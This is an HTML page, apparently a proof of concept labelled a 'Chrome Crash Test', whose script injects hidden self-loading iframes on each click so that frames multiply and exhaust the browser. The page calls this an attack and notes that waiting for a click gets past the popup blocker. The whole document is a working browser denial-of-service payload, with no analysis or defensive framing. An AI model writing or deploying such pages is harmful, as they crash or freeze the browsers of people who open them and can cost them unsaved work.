<!DOCTYPE html>
<html>
<head>
    <title>Hidden iframe Crash</title>
</head>
<body>
    <h1>Chrome Crash Test - Hidden iframe</h1>
    <p>Click anywhere to start the attack.</p>

    <script>
        function injectHiddenIframes(numFrames) {
            for (let i = 0; i < numFrames; i++) {
                let iframe = document.createElement("iframe");
                iframe.style.display = "none"; // Hide iframe
                iframe.src = window.location.href; // Load crash script
                document.body.appendChild(iframe);
            }
        }

        // Require user interaction to bypass popup blocker
        document.addEventListener("click", function() {
            injectHiddenIframes(5); // Adjust number of hidden crash iframes
        });
    </script>
</body>
</html>
